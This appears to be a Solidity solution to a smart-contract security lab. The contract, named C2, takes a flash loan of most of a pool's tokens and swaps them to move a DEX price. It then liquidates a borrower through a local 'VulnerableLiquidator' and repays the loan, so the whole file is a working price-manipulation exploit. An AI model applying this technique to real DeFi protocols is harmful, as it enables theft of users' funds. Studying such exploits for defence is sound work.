// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.28;
import "@openzeppelin/contracts/token/ERC20/IERC20.sol";

import "./FlashLoanPool.sol";
import "./SimpleDEX.sol";
import "./VulnerableLiquidator.sol";

contract C2 {
	IERC20 public tokenA;
	IERC20 public tokenB;
	FlashLoanPool public flashLoanPool;
	SimpleDEX public dex;
	VulnerableLiquidator public liquidator;
    address public borrower;

    constructor(address _tokenA, address _tokenB, address _flashLoanPool, address _dex, address _liquidator, address _borrower) {
		tokenA = IERC20(_tokenA);
		tokenB = IERC20(_tokenB);
		flashLoanPool = FlashLoanPool(_flashLoanPool);
		dex = SimpleDEX(_dex);
        liquidator = VulnerableLiquidator(_liquidator);
        borrower = _borrower;
	}

    function myLiquidate() public {
		uint256 totalPoolTokenA = tokenA.balanceOf(address(flashLoanPool));
		uint256 amount = (totalPoolTokenA * 80) / 100;

		flashLoanPool.flashLoan(address(tokenA), amount, "0x0");
    }

    function onFlashLoan(address token, uint256 amount, bytes calldata data) external {
        tokenA.approve(address(dex), amount);
        dex.swap(address(tokenA), amount);

        require(!liquidator.isHealthy(borrower), "The borrower is healthy.");
        tokenB.approve(address(liquidator), tokenB.balanceOf(address(this)));
        liquidator.liquidate(borrower);

        uint256 amountB2A = (tokenB.balanceOf(address(this)));
        tokenB.approve(address(dex), amountB2A);
        dex.swap(address(tokenB), amountB2A);

        tokenA.transfer(address(flashLoanPool), amount);
    }
}